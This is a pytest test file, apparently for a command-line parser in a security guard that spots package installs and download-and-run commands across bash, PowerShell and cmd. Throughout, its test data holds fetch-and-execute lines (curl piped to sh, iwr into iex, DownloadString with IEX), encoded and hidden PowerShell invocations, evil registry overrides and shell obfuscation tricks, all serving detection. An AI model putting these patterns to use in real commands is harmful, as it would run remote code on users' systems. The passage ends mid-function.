"""engine/parse.py: splitting, unwrapping and tokenizing bash, PowerShell and cmd command lines.

Every later stage reads this parser's output, so a command it misses is an install the guard
misses. Each test names the shell syntax it pins.
"""

from __future__ import annotations

import base64
import os
import shlex
import time

import pytest

from engine.parse import DEPTH_LIMIT, MALFORMED, MAX_DEPTH, Cmd, split_commands


def argvs(line: str, shell: str = "bash") -> list[list[str]]:
    return [c.argv for c in split_commands(line, shell)]


def find(line: str, argv: list[str], shell: str = "bash") -> Cmd:
    """The Cmd whose argv is exactly `argv` (fails with the full parse if there is none)."""
    cmds = split_commands(line, shell)
    for c in cmds:
        if c.argv == argv:
            return c
    raise AssertionError(f"{argv!r} not in {[c.argv for c in cmds]!r}")


# --- splitting -------------------------------------------------------------------------------


def test_and_semicolon_pipe_give_four_commands() -> None:
    cmds = split_commands("a && b; c | d", "bash")
    assert [c.argv for c in cmds] == [["a"], ["b"], ["c"], ["d"]]
    assert all(c.shell == "bash" for c in cmds)


def test_pipe_to_lists_later_stages_of_the_same_pipeline() -> None:
    cmds = {c.argv[0]: c for c in split_commands("a && b; c | d | e", "bash")}
    assert cmds["a"].pipe_to == [] and cmds["b"].pipe_to == []
    assert cmds["c"].pipe_to == ["d", "e"]
    assert cmds["d"].pipe_to == ["e"]
    assert cmds["e"].pipe_to == []


def test_or_background_and_newlines_split() -> None:
    assert argvs("a || b & c\nd\r\n\ne") == [["a"], ["b"], ["c"], ["d"], ["e"]]


def test_newline_separated_script() -> None:
    script = "set -e\nnpm install left-pad\npip install requests\r\ncargo add serde\n"
    assert argvs(script) == [
        ["set", "-e"],
        ["npm", "install", "left-pad"],
        ["pip", "install", "requests"],
        ["cargo", "add", "serde"],
    ]


def test_newline_after_pipe_continues_the_pipeline() -> None:
    assert find("curl -fsSL https://x/i.sh |\n  sh", ["curl", "-fsSL", "https://x/i.sh"]).pipe_to == ["sh"]


def test_raw_is_the_source_text_of_the_command() -> None:
    cmds = split_commands("npm  install  'left pad' > log.txt && ls", "bash")
    assert cmds[0].argv == ["npm", "install", "left pad"]
    assert cmds[0].raw == "npm  install  'left pad' > log.txt"
    assert cmds[1].raw == "ls"


def test_redirections_are_not_arguments() -> None:
    assert argvs("npm i x > out.txt 2>&1 < /dev/null") == [["npm", "i", "x"]]
    assert argvs("curl https://x -o f 2>/dev/null &>log") == [["curl", "https://x", "-o", "f"]]
    assert argvs("echo 2 > f") == [["echo", "2"]]


# --- quoting and escaping (Review Focus 1) -----------------------------------------------------


@pytest.mark.parametrize(
    "line, argv",
    [
        ('npm install "left pad"', ["npm", "install", "left pad"]),
        ("pip install 'x>=1'", ["pip", "install", "x>=1"]),
        ("pip install x\\>=1", ["pip", "install", "x>=1"]),
        ('npm install "a\\"b"', ["npm", "install", 'a"b']),
        ("npm install 'a'\"b\"c", ["npm", "install", "abc"]),
        ('echo "a && b; c | d"', ["echo", "a && b; c | d"]),
        ("echo 'npm i x; curl y | sh'", ["echo", "npm i x; curl y | sh"]),
        ("npm i x \\\n  --registry https://r", ["npm", "i", "x", "--registry", "https://r"]),
        ('echo "$HOME" ${PATH} $1', ["echo", "$HOME", "${PATH}", "$1"]),
    ],
)
def test_bash_quoting(line: str, argv: list[str]) -> None:
    assert argvs(line) == [argv]


@pytest.mark.parametrize(
    "line",
    [
        'npm install "left pad" --save',
        "pip install 'x>=1,<2' -i https://nexus/simple",
        "a 'b c' \"d e\" f\\ g",
        'git commit -m "add curl" --author "A B <a@b>"',
        "curl -H 'Authorization: Bearer x' https://h/p?q=1",
    ],
)
def test_bash_tokens_match_shlex(line: str) -> None:
    assert argvs(line) == [shlex.split(line)]


def test_ansi_c_quoting_is_decoded() -> None:
    assert argvs("$'\\x6e\\x70\\x6d' i x") == [["npm", "i", "x"]]
    assert argvs("echo $'a\\tb\\'c'") == [["echo", "a\tb'c"]]


@pytest.mark.parametrize(
    "line, argv",
    [
        ('npm install "left`"pad"', ["npm", "install", 'left"pad']),
        ("npm install left` pad", ["npm", "install", "left pad"]),
        ('Write-Output "a`tb"', ["Write-Output", "a\tb"]),
        ("npm install 'it''s'", ["npm", "install", "it's"]),
        ('npm install "say ""hi"""', ["npm", "install", 'say "hi"']),
        ("npm install 'C:\\tmp\\x'", ["npm", "install", "C:\\tmp\\x"]),
        ("npm install \u201cleft pad\u201d", ["npm", "install", "left pad"]),
        ("npm i x `\n  --registry https://r", ["npm", "i", "x", "--registry", "https://r"]),
        ("i`wr https://x", ["iwr", "https://x"]),
    ],
)
def test_powershell_quoting_and_backticks(line: str, argv: list[str]) -> None:
    assert argvs(line, "powershell") == [argv]


def test_powershell_separators() -> None:
    assert argvs("a; b | c && d || e\nf", "powershell") == [["a"], ["b"], ["c"], ["d"], ["e"], ["f"]]
    assert argvs('echo "a; b | c"', "powershell") == [["echo", "a; b | c"]]


def test_powershell_commas_separate_array_items() -> None:
    assert argvs("Install-Module A,B -Force", "powershell") == [["Install-Module", "A", "B", "-Force"]]


@pytest.mark.parametrize(
    "line, argvs_",
    [
        ("npm install left^&pad", [["npm", "install", "left&pad"]]),
        ("echo a ^| npm i x", [["echo", "a", "|", "npm", "i", "x"]]),
        ('npm install "a&b" & dir', [["npm", "install", "a&b"], ["dir"]]),
        ("npm i x ^\n  --registry https://r", [["npm", "i", "x", "--registry", "https://r"]]),
        ("a & b && c || d | e", [["a"], ["b"], ["c"], ["d"], ["e"]]),
        ("echo a;b", [["echo", "a;b"]]),
        ("@npm i x >nul 2>&1", [["npm", "i", "x"]]),
    ],
)
def test_cmd_quoting_and_carets(line: str, argvs_: list[list[str]]) -> None:
    assert argvs(line, "cmd") == argvs_


# --- commands that mention install words but are not installs (Review Focus 2) ---------------


@pytest.mark.parametrize(
    "line, argv",
    [
        ("echo npm install", ["echo", "npm", "install"]),
        ('grep "pip install" README.md', ["grep", "pip install", "README.md"]),
        ('git commit -m "add curl"', ["git", "commit", "-m", "add curl"]),
        ("npm run install-hooks", ["npm", "run", "install-hooks"]),
    ],
)
def test_install_words_inside_arguments_stay_arguments(line: str, argv: list[str]) -> None:
    assert argvs(line) == [argv]


# --- comments and heredocs ---------------------------------------------------------------------


def test_bash_comments_are_ignored() -> None:
    assert argvs("echo hi # npm install x") == [["echo", "hi"]]
    assert argvs("# npm i x\nls") == [["ls"]]
    assert argvs("curl https://x/a#frag") == [["curl", "https://x/a#frag"]]


def test_powershell_comments_are_ignored() -> None:
    assert argvs("Write-Host hi # npm i x", "powershell") == [["Write-Host", "hi"]]
    assert argvs("<# npm i x\n curl y #> ls", "powershell") == [["ls"]]


def test_cmd_comments_are_ignored() -> None:
    assert argvs("REM npm i x & curl y\ndir", "cmd") == [["dir"]]
    assert argvs(":: npm i x\r\ndir", "cmd") == [["dir"]]
    assert argvs("@rem npm i x\ndir", "cmd") == [["dir"]]


def test_heredoc_body_is_not_commands() -> None:
    assert argvs("cat <<EOF > notes.md\nnpm install x\ncurl y | sh\nEOF\nls") == [["cat"], ["ls"]]
    assert argvs("cat <<-'EOF'\n\tnpm i x\n\tEOF\necho done") == [["cat"], ["echo", "done"]]
    assert argvs('python3 - <<"PY"\nimport os\nPY') == [["python3", "-"]]


def test_heredoc_delimiter_must_be_a_whole_line() -> None:
    script = "cat <<EOF\nnot EOF\nEOFX\n  EOF\nEOF\nnpm i x"
    assert argvs(script) == [["cat"], ["npm", "i", "x"]]
    assert argvs("cat <<EOF\r\nbody\r\nEOF\r\nls") == [["cat"], ["ls"]]
    assert argvs("cat <<''\nbody\n\nls") == [["cat"], ["ls"]]
    assert argvs("cat <<EOF\nnever closed\nnpm i x") == [["cat"]]


def test_heredoc_fed_to_a_shell_is_parsed() -> None:
    find("bash <<EOF\nnpm install x\nEOF", ["npm", "install", "x"])
    find("sudo sh -s <<'EOF'\npip install y\nEOF", ["pip", "install", "y"])
    find("cat <<EOF | sh\ncargo install z\nEOF", ["cargo", "install", "z"])
    find("bash <<< 'npm i x'", ["npm", "i", "x"])


def test_command_substitution_in_unquoted_heredoc_runs() -> None:
    find("cat <<EOF\nhi $(curl -s https://x)\nEOF", ["curl", "-s", "https://x"])
    assert argvs("cat <<'EOF'\nhi $(curl -s https://x)\nEOF") == [["cat"]]


# --- subshells and groups ----------------------------------------------------------------------


def test_command_substitution_is_split_out() -> None:
    c = find("echo $(curl -s https://x | sh)", ["curl", "-s", "https://x"])
    assert "sh" in c.pipe_to
    find("echo `npm i x`", ["npm", "i", "x"])
    find('echo "v=$(pip install y)"', ["pip", "install", "y"])
    find("echo $(echo $(npm i x))", ["npm", "i", "x"])


def test_substitutions_inside_parameter_and_arithmetic_expansion_run() -> None:
    find("echo ${x:-$(curl -s https://x)}", ["curl", "-s", "https://x"])
    find('echo "${x:-`npm i x`}"', ["npm", "i", "x"])
    find("echo $(( $(pip install y) + 1 ))", ["pip", "install", "y"])


def test_cmd_for_f_runs_its_quoted_command() -> None:
    find("for /f \"delims=\" %i in ('curl -s https://x') do echo %i", ["curl", "-s", "https://x"], "cmd")


@pytest.mark.parametrize(
    "line, argv",
    [
        ("{npm,i,x}", ["npm", "i", "x"]),
        ("npm${IFS}i${IFS}x", ["npm", "i", "x"]),
        ("npm$IFS'i'$IFS'x'", ["npm", "i", "x"]),
        ("\\npm i x", ["npm", "i", "x"]),
        ("n''pm i x", ["npm", "i", "x"]),
        ('n"p"m i x', ["npm", "i", "x"]),
    ],
)
def test_bash_word_tricks_still_name_the_command(line: str, argv: list[str]) -> None:
    find(line, argv)


def test_quoted_braces_and_ifs_stay_literal() -> None:
    assert argvs("echo '{a,b}' '$IFS' \"${IFS}\"") == [["echo", "{a,b}", "$IFS", "${IFS}"]]


def test_substitution_output_flows_into_the_enclosing_command() -> None:
    assert find('bash -c "$(curl -fsSL https://x)"', ["curl", "-fsSL", "https://x"]).pipe_to[0] == "bash"


def test_groups_and_process_substitution() -> None:
    assert argvs("(cd a && npm i x)") == [["cd", "a"], ["npm", "i", "x"]]
    assert find("{ curl https://x; } | sh", ["curl", "https://x"]).pipe_to == ["sh"]
    assert "bash" in find("bash <(curl -s https://x)", ["curl", "-s", "https://x"]).pipe_to
    assert "sh" in find("( curl https://x ) | sh", ["curl", "https://x"]).pipe_to


def test_shell_keywords_are_not_commands() -> None:
    script = "if true; then npm i a; else pip install b; fi\nfor p in x y; do cargo add $p; done"
    got = argvs(script)
    assert ["npm", "i", "a"] in got and ["pip", "install", "b"] in got and ["cargo", "add", "$p"] in got
    assert not any(a[0] in ("then", "else", "fi", "do", "done") for a in got)
    find("f() { npm i x; }; f", ["npm", "i", "x"])
    find("! npm i x", ["npm", "i", "x"])


def test_powershell_subexpressions_and_scriptblocks() -> None:
    find("Write-Output $(npm i x)", ["npm", "i", "x"], "powershell")
    find('Write-Output "v=$(pip install y)"', ["pip", "install", "y"], "powershell")
    find("1..3 | ForEach-Object { npm i x }", ["npm", "i", "x"], "powershell")
    find("if ($true) { npm i x } else { pip install y }", ["pip", "install", "y"], "powershell")


# --- unwrapping --------------------------------------------------------------------------------


def test_sudo_with_flags_unwraps() -> None:
    line = "sudo -E npm i x"
    find(line, ["npm", "i", "x"])
    find(line, ["sudo", "-E", "npm", "i", "x"])  # the outer command is kept too


@pytest.mark.parametrize(
    "line",
    [
        "sudo -u bob -H npm i x",
        "sudo -iu bob npm i x",
        "sudo --preserve-env=PATH -- npm i x",
        "doas -u root npm i x",
        "time npm i x",
        "time -p nohup sudo npm i x",
        "nohup npm i x &",
        "exec npm i x",
        "command npm i x",
        "nice -n 10 npm i x",
        "timeout -s KILL 60 npm i x",
        "/usr/bin/sudo npm i x",
        "busybox nohup npm i x",
    ],
)
def test_argv_wrappers_unwrap(line: str) -> None:
    find(line, ["npm", "i", "x"])


def test_command_v_is_a_lookup_not_a_run() -> None:
    assert argvs("command -v npm") == [["command", "-v", "npm"]]


def test_env_assignments_unwrap_and_are_kept() -> None:
    c = find("env A=1 pip install y", ["pip", "install", "y"])
    assert c.env == {"A": "1"}
    c = find("env -i PIP_INDEX_URL=https://evil/simple pip install y", ["pip", "install", "y"])
    assert c.env["PIP_INDEX_URL"] == "https://evil/simple"
    c = find("NPM_CONFIG_REGISTRY=https://evil npm i x", ["npm", "i", "x"])
    assert c.env == {"NPM_CONFIG_REGISTRY": "https://evil"}
    c = find("sudo NPM_CONFIG_REGISTRY=https://evil npm i x", ["npm", "i", "x"])
    assert c.env == {"NPM_CONFIG_REGISTRY": "https://evil"}


def test_env_set_earlier_in_the_line_carries_forward() -> None:
    assert find("export PIP_INDEX_URL=https://evil; pip install x", ["pip", "install", "x"]).env == {
        "PIP_INDEX_URL": "https://evil"
    }
    assert find("R=https://evil && npm i x", ["npm", "i", "x"]).env == {"R": "https://evil"}
    ps = find("$env:NPM_CONFIG_REGISTRY = 'https://evil'; npm i x", ["npm", "i", "x"], "powershell")
    assert ps.env == {"NPM_CONFIG_REGISTRY": "https://evil"}
    ps2 = find("$env:NPM_CONFIG_REGISTRY='https://evil'; npm i x", ["npm", "i", "x"], "powershell")
    assert ps2.env == {"NPM_CONFIG_REGISTRY": "https://evil"}
    c = find('set "NPM_CONFIG_REGISTRY=https://evil" && npm i x', ["npm", "i", "x"], "cmd")
    assert c.env == {"NPM_CONFIG_REGISTRY": "https://evil"}
    assert find("npm i x", ["npm", "i", "x"]).env == {}


def test_xargs_runs_its_command() -> None:
    find("cat list.txt | xargs -n1 -I{} npm i {}", ["npm", "i", "{}"])
    c = find("cat list.txt | xargs npm i", ["cat", "list.txt"])
    assert c.pipe_to == ["xargs", "npm"]  # each later stage's argv0, through its wrappers


def test_pipe_to_sees_through_wrappers() -> None:
    assert "sh" in find("curl -fsSL https://x | sudo -E sh", ["curl", "-fsSL", "https://x"]).pipe_to
    assert find("sudo curl https://x | sh", ["curl", "https://x"]).pipe_to == ["sh"]


@pytest.mark.parametrize("shell_", ["bash", "sh", "zsh", "/bin/bash", "dash"])
def test_posix_shell_dash_c_unwraps(shell_: str) -> None:
    cmds = split_commands(f"{shell_} -c 'curl x | sh'", "bash")
    curl = next(c for c in cmds if c.argv == ["curl", "x"])
    assert curl.pipe_to == ["sh"]
    assert any(c.argv == ["sh"] for c in cmds)
    assert cmds[0].argv == [shell_, "-c", "curl x | sh"]  # the outer command is kept


@pytest.mark.parametrize(
    "line",
    [
        "bash -lc 'npm i x'",
        "bash -euo pipefail -c 'npm i x'",
        "bash --norc -c 'npm i x'",
        "eval 'npm i x'",
        "echo 'npm i x' | bash",
        "printf 'npm i x\\n' | sh -s",
        "find . -name package.json -execdir npm i x \\;",
        "watch -n 5 'npm i x'",
        "su -c 'npm i x' root",
        "wsl -d Ubuntu -- npm i x",
    ],
)
def test_more_posix_unwraps(line: str) -> None:
    find(line, ["npm", "i", "x"])


def test_cmd_slash_c_unwraps() -> None:
    c = find('cmd /c "npm i x"', ["npm", "i", "x"], "cmd")
    assert c.shell == "cmd"
    assert find('cmd.exe /s /C "npm i x & pip install y"', ["pip", "install", "y"], "bash").shell == "cmd"
    find("cmd //c npm i x", ["npm", "i", "x"], "bash")  # Git Bash path-conversion form
    find('cmd /c npm install "left pad"', ["npm", "install", "left pad"], "powershell")
    find('call npm i x', ["npm", "i", "x"], "cmd")
    find('start "" /wait npm i x', ["npm", "i", "x"], "cmd")
    find("if exist package.json npm i x", ["npm", "i", "x"], "cmd")
    find("if not exist node_modules (npm i x) else (echo ok)", ["npm", "i", "x"], "cmd")
    find("for %i in (a b) do npm i %i", ["npm", "i", "%i"], "cmd")


@pytest.mark.parametrize("outer", ["bash", "powershell", "cmd"])
def test_powershell_dash_c_unwraps(outer: str) -> None:
    cmds = split_commands('powershell -c "iwr https://x | iex"', outer)
    iwr = next(c for c in cmds if c.argv == ["iwr", "https://x"])
    assert iwr.shell == "powershell"
    assert iwr.pipe_to == ["iex"]


@pytest.mark.parametrize(
    "line",
    [
        'pwsh -c "npm i x"',
        'pwsh -NoProfile -NonInteractive -Command "npm i x"',
        'powershell.exe -NoP -W Hidden -ExecutionPolicy Bypass -Command "npm i x"',
        'powershell -Command npm i x',
        'powershell "npm i x"',
        'powershell /c "npm i x"',
        "powershell \u2013Command 'npm i x'",
    ],
)
def test_powershell_command_forms(line: str) -> None:
    assert find(line, ["npm", "i", "x"]).shell == "powershell"


@pytest.mark.parametrize("flag", ["-EncodedCommand", "-enc", "-e", "-ec", "-encodedcommand"])
def test_powershell_encoded_command_is_decoded(flag: str) -> None:
    b64 = base64.b64encode("iwr https://x | iex; npm i x".encode("utf-16-le")).decode("ascii")
    for outer in ("bash", "powershell", "cmd"):
        cmds = split_commands(f"powershell -NoProfile {flag} {b64}", outer)
        assert ["npm", "i", "x"] in [c.argv for c in cmds]
        assert next(c for c in cmds if c.argv == ["iwr", "https://x"]).pipe_to == ["iex"]


def test_undecodable_encoded_command_is_marked() -> None:
    cmds = split_commands("powershell -enc !!notbase64!!x", "powershell")
    assert any(c.raw.startswith(MALFORMED) for c in cmds)


@pytest.mark.parametrize(
    "line",
    [
        "Start-Process npm -ArgumentList 'i','x'",
        "Start-Process -FilePath npm -ArgumentList 'i x' -Wait",
        "Start-Process npm 'i','x' -NoNewWindow",
        "saps npm -Args @('i','x')",
        "start npm -ArgumentList 'i','x'",
        "Start-Process -Wait -FilePath 'C:\\nodejs\\npm.cmd' -ArgumentList '-g','x' -Verb RunAs",
    ],
)
def test_start_process_unwraps(line: str) -> None:
    got = argvs(line, "powershell")
    assert ["npm", "i", "x"] in got or ["C:\\nodejs\\npm.cmd", "-g", "x"] in got, got


def test_start_process_running_cmd_unwraps_twice() -> None:
    find("Start-Process cmd -ArgumentList '/c','npm i x'", ["npm", "i", "x"], "powershell")


@pytest.mark.parametrize(
    "line, argv",
    [
        ("& npm.cmd i x", ["npm.cmd", "i", "x"]),
        ("& 'C:\\Program Files\\nodejs\\npm.cmd' install x", ["C:\\Program Files\\nodejs\\npm.cmd", "install", "x"]),
        ("& { npm i x }", ["npm", "i", "x"]),
        (". npm i x", ["npm", "i", "x"]),
        ("iex 'npm i x'", ["npm", "i", "x"]),
        ("Invoke-Expression -Command \"npm i x\"", ["npm", "i", "x"]),
        ("'npm i x' | iex", ["npm", "i", "x"]),
        ("@'\nnpm i x\n'@ | iex", ["npm", "i", "x"]),
        ('@"\nWrite-Output $(npm i x)\n"@', ["npm", "i", "x"]),
        ("$out = npm i x", ["npm", "i", "x"]),
        ("cmd /c --% npm i \"x\"", ["npm", "i", "x"]),
    ],
)
def test_powershell_call_operator_and_invoke_expression(line: str, argv: list[str]) -> None:
    find(line, argv, "powershell")


def test_iex_of_a_download_is_a_pipe_into_iex() -> None:
    assert "iex" in find("iex (iwr https://x)", ["iwr", "https://x"], "powershell").pipe_to
    c = find("(New-Object Net.WebClient).DownloadString('https://x') | iex", ["New-Object", "Net.WebClient"], "powershell")
    assert "iex" in c.pipe_to


def test_nested_wrappers_unwrap_recursively() -> None:
    line = "sudo -E bash -c \"cmd /c 'powershell -c npm i x'\""
    c = find(line, ["npm", "i", "x"])
    assert c.shell == "powershell"


def test_depth_limit_stops_and_marks() -> None:
    line = "npm i x"
    for _ in range(MAX_DEPTH + 2):
        line = "bash -c " + shlex.quote(line)
    cmds = split_commands(line, "bash")
    assert ["npm", "i", "x"] not in [c.argv for c in cmds]
    assert any(c.raw.startswith(DEPTH_LIMIT) for c in cmds)
    ok = "npm i x"
    for _ in range(MAX_DEPTH):
        ok = "bash -c " + shlex.quote(ok)
    find(ok, ["npm", "i", "x"])


# --- malformed input never raises -------------------------------------------------------------

NASTY = [
    "npm i 'x",
    'npm i "x',
    "echo $(npm i x",
    "echo `npm i x",
    "( npm i x",
    "{ npm i x",
    "echo ${x",
    "echo $((1+",
    "cat <<EOF\nnpm i x",
    "\\",
    "'",
    "&&||;;|&",
    "))))((((",
    "\x00\x01\x02 npm i x",
    "$'\\x",
    "bash -c",
    "powershell -enc",
    "Start-Process",
    "a" * 10000 + " '" + "b" * 10000,
    "$(" * 3000 + "npm i x",
]


@pytest.mark.parametrize("line", NASTY, ids=range(len(NASTY)))
@pytest.mark.parametrize("shell_", ["bash", "powershell", "cmd"])
def test_nasty_input_never_raises(line: str, shell_: str) -> None:
    cmds = split_commands(line, shell_)
    assert isinstance(cmds, list)
    assert all(isinstance(c, Cmd) and isinstance(c.argv, list) for c in cmds)


def test_unterminated_quote_falls_back_to_whitespace_split_and_marks_raw() -> None:
    cmds = split_commands("npm i 'x && curl https://y | sh", "bash")
    assert any(c.argv[:2] == ["npm", "i"] for c in cmds)
    curl = next(c for c in cmds if c.argv[0] == "curl")
    assert curl.raw.startswith(MALFORMED)
    assert curl.pipe_to == ["sh"]
    assert any(c.argv[:2] == ["npm", "i"] for c in split_commands('npm i "x', "powershell"))
    assert any(c.argv[:2] == ["npm", "i"] for c in split_commands('npm i "x & dir', "cmd"))


def test_an_internal_error_still_returns_marked_commands(monkeypatch: pytest.MonkeyPatch) -> None:
    import engine.parse as parse

    def boom(*args: object) -> None:
        raise RuntimeError("bug")

    monkeypatch.setattr(parse, "_emit", boom)
    cmds = split_commands("npm i 'x' && curl https://y | sh", "bash")
    assert [c.argv for c in cmds] == [["npm", "i", "x"], ["curl", "https://y"], ["sh"]]
    assert all(c.raw.startswith(MALFORMED) for c in cmds)
    assert cmds[1].pipe_to == ["sh"]


def test_env_flood_marks_later_commands() -> None:
    line = "".join(f"export V{i}=x; " for i in range(100)) + "npm i x"
    npm = find(line, ["npm", "i", "x"])
    assert npm.raw.startswith(MALFORMED)
    assert not find("export A=1; npm i x", ["npm", "i", "x"]).raw.startswith(MALFORMED)


def test_garbage_collector_state_is_restored(monkeypatch: pytest.MonkeyPatch) -> None:
    import gc

    import engine.parse as parse

    assert gc.isenabled()
    split_commands("npm i x", "bash")
    assert gc.isenabled()
    gc.disable()
    try:
        split_commands("npm i x", "bash")
        assert not gc.isenabled()
    finally:
        gc.enable()
    monkeypatch.setattr(parse, "_dedup", lambda cmds: 1 / 0)
    with pytest.raises(ZeroDivisionError):
        split_commands("npm i x", "bash")
    assert gc.isenabled()


def test_shell_names_and_odd_input() -> None:
    assert split_commands("npm i x", "pwsh")[0].shell == "powershell"
    assert split_commands("npm i x", "zsh")[0].shell == "bash"
    assert split_commands("npm i x", "cmd.exe")[0].shell == "cmd"
    assert split_commands("", "bash") == []
    assert split_commands("   \n  ", "powershell") == []
    assert split_commands("\ufeffnpm i x", "bash")[0].argv == ["npm", "i", "x"]
    assert split_commands("echo h\u00e9llo \u2192 \u4e16\u754c", "bash")[0].argv == ["echo", "h\u00e9llo", "\u2192", "\u4e16\u754c"]


# --- fix round 1: env-aware dedup, cwd, PowerShell call parens, cmd start, more wrappers -------


def test_dedup_keeps_commands_that_differ_by_env() -> None:
    line = (
        "export NPM_CONFIG_REGISTRY=https://nexus.corp/r; npm i x; "
        "export NPM_CONFIG_REGISTRY=https://evil.com; npm i x"
    )
    npms = [c for c in split_commands(line, "bash") if c.argv == ["npm", "i", "x"]]
    regs = {c.env.get("NPM_CONFIG_REGISTRY") for c in npms}
    assert regs == {"https://nexus.corp/r", "https://evil.com"}


def test_identical_commands_with_identical_env_still_merge() -> None:
    cmds = [c for c in split_commands("npm i x | npm i x", "bash") if c.argv == ["npm", "i", "x"]]
    assert len(cmds) == 1


def test_cwd_tracks_cd_within_one_input() -> None:
    cmds = [c for c in split_commands("pip install x; cd /tmp/evil; pip install x", "bash") if c.argv[:2] == ["pip", "install"]]
    assert len(cmds) == 2
    assert cmds[0].cwd is None
    assert cmds[1].cwd == "/tmp/evil"


def test_cwd_tracks_pushd_and_powershell_and_cmd() -> None:
    assert find("pushd /opt && npm i x", ["npm", "i", "x"]).cwd == "/opt"
    for cd in ("cd", "sl", "Set-Location", "chdir"):
        c = find(f"{cd} C:\\evil; npm i x", ["npm", "i", "x"], "powershell")
        assert c.cwd == "C:\\evil", cd
    assert find("cd /d D:\\evil && npm i x", ["npm", "i", "x"], "cmd").cwd == "D:\\evil"


def test_powershell_call_parens_split_the_command_name() -> None:
    c = find("iex(iwr https://x)", ["iwr", "https://x"], "powershell")
    assert "iex" in c.pipe_to
    c = find("IEX(New-Object Net.WebClient).DownloadString('http://x')", ["New-Object", "Net.WebClient"], "powershell")
    assert any(p.lower() == "iex" for p in c.pipe_to)
    assert find("npm('install') x", ["npm", "('install')", "x"], "powershell").argv[0] == "npm"
    assert find("npm.cmd('i') x", ["npm.cmd", "('i')", "x"], "powershell").argv[0] == "npm.cmd"


@pytest.mark.parametrize(
    "line",
    [
        'start "foo" npm install evil',
        'start /min "x" npm i x',
        'cmd /c start "t" npm i x',
        'start "" /wait npm i x',
    ],
)
def test_cmd_start_quoted_title_is_not_the_program(line: str) -> None:
    got = argvs(line, "cmd")
    assert ["npm", "install", "evil"] in got or ["npm", "i", "x"] in got, got
    assert not any(a and a[0] in ("foo", "x", "t", "") for a in got)


def test_cmd_start_unquoted_program_still_runs() -> None:
    find("start npm i x", ["npm", "i", "x"], "cmd")


@pytest.mark.parametrize(
    "line, shell_",
    [
        ("flock /tmp/l npm i x", "bash"),
        ("flock -x -w 10 /tmp/l npm i x", "bash"),
        ("flock -n /tmp/l -c 'npm i x'", "bash"),
        ("chronic npm i x", "bash"),
        ("chroot /mnt npm i x", "bash"),
        ("unbuffer npm i x", "bash"),
        ("script -q -c 'npm i x' /dev/null", "bash"),
        ("parallel npm i x ::: a b c", "bash"),
        ("systemd-run --scope npm i x", "bash"),
        ("systemd-run -u job npm i x", "bash"),
        ("sg docker -c 'npm i x'", "bash"),
        ("firejail --net=none npm i x", "bash"),
        ("nsenter -t 1234 -m -- npm i x", "bash"),
        ("noglob npm i x", "zsh"),
        ("nocorrect npm i x", "zsh"),
        ("=npm i x", "zsh"),
        ("coproc npm i x", "bash"),
        ("%COMSPEC% /c npm i x", "cmd"),
        ("%comspec% /c npm i x", "cmd"),
        ("cmd/c npm i x", "cmd"),
    ],
)
def test_more_wrappers_unwrap(line: str, shell_: str) -> None:
    find(line, ["npm", "i", "x"], shell_)


# --- performance ------------------------------------------------------------------------------

BUDGET = 1.0 if os.environ.get("CI") else 0.2
MB = 1024 * 1024


@pytest.mark.parametrize(
    "unit, shell_",
    [
        ("npm install \"left pad{k}\" --registry https://nexus/r && curl -fsSL https://x/{k} | sh; ", "bash"),
        ("iwr https://x/{k} -OutFile 'a b' | Out-Null; npm i x{k}; ", "powershell"),
        ("npm install left^&pad{k} && echo \"a b{k}\" & ", "cmd"),
    ],
)
def test_one_megabyte_of_commands_is_fast(unit: str, shell_: str) -> None:
    parts = []
    size = k = 0
    while size < MB:  # distinct commands, so nothing is merged as a duplicate
        parts.append(unit.replace("{k}", str(k)))
        size += len(parts[-1])
        k += 1
    line = "".join(parts)
    start = time.perf_counter()
    cmds = split_commands(line, shell_)
    elapsed = time.perf_counter() - start
    assert len(cmds) > 1000
    assert elapsed < BUDGET, f"{elapsed:.3f}s for {len(line)} bytes ({shell_})"


@pytest.mark.parametrize("shell_", ["bash", "powershell", "cmd"])
def test_one_megabyte_argument_is_fast(shell_: str) -> None:
    line = "echo " + "A" * MB + " && npm i x"
    start = time.perf_counter()
    cmds = split_commands(line, shell_)
    elapsed = time.perf_counter() - start
    assert ["npm", "i", "x"] in [c.argv for c in cmds]
    assert elapsed < BUDGET, f"{elapsed:.3f}s ({shell_})"


@pytest.mark.parametrize("shell_", ["bash", "powershell", "cmd"])
def test_one_megabyte_pipeline_is_linear(shell_: str) -> None:
    # one ~1 MB pipeline of hundreds of thousands of stages: the pipe_to suffixes must stay linear
    # (this shape ran in ~8.5 s at 64 KB before the fix). It is pathological, so it uses the wider
    # many-commands budget; linearity is checked separately below.
    n = MB // 2
    line = "a" + "|a" * n
    start = time.perf_counter()
    cmds = split_commands(line, shell_)
    elapsed = time.perf_counter() - start
    assert cmds and cmds[0].argv == ["a"]
    # ~524k stages/Cmds: generous bound (the quadratic bug needed minutes); linearity is pinned below
    assert elapsed < BUDGET * 8, f"{elapsed:.3f}s ({shell_})"


def test_long_malformed_pipeline_is_linear() -> None:
    n = MB // 2
    line = "npm i 'x | " + "a|" * n + "a"  # an unterminated quote forces the crude fallback
    start = time.perf_counter()
    cmds = split_commands(line, "bash")
    elapsed = time.perf_counter() - start
    assert cmds and all(c.raw.startswith(MALFORMED) for c in cmds)
    assert elapsed < BUDGET * 8, f"{elapsed:.3f}s"


def test_pipeline_time_scales_linearly() -> None:
    def timed(stages: int) -> float:
        line = "a" + "|a" * stages
        start = time.perf_counter()
        split_commands(line, "bash")
        return time.perf_counter() - start

    timed(20000)  # warm up
    small = min(timed(40000) for _ in range(3))
    big = min(timed(160000) for _ in range(3))
    # 4x the work must cost well under 10x the time (quadratic would be ~16x)
    assert big < small * 10, f"small={small:.3f}s big={big:.3f}s"


@pytest.mark.parametrize("shell_, unit", [("bash", "a{k};"), ("powershell", "a{k};"), ("cmd", "a{k}&")])
def test_one_megabyte_of_tiny_commands_is_bounded(shell_: str, unit: str) -> None:
    # the worst case: about 150,000 one-word commands
    parts = []
    size = k = 0
    while size < MB:
        parts.append(unit.replace("{k}", str(k)))
        size += len(parts[-1])
        k += 1
    start = time.perf_counter()
    cmds = split_commands("".join(parts), shell_)
    elapsed = time.perf_counter() - start
    assert len(cmds) == k
    assert elapsed < BUDGET * 2.5, f"{elapsed:.3f}s ({shell_})"


def test_many_heredocs_stay_fast() -> None:
    line = "".join(f"cat <<E{k}\nnpm i x\nE{k}\n" for k in range(60000)) + "pip install y"
    start = time.perf_counter()
    cmds = split_commands(line, "bash")
    assert time.perf_counter() - start < BUDGET * 2.5
    assert len(cmds) == 60001 and cmds[-1].argv == ["pip", "install", "y"]


def test_many_env_assignments_stay_fast() -> None:
    line = "".join(f"export V{i}=x; true; " for i in range(40000)) + "npm i x"
    start = time.perf_counter()
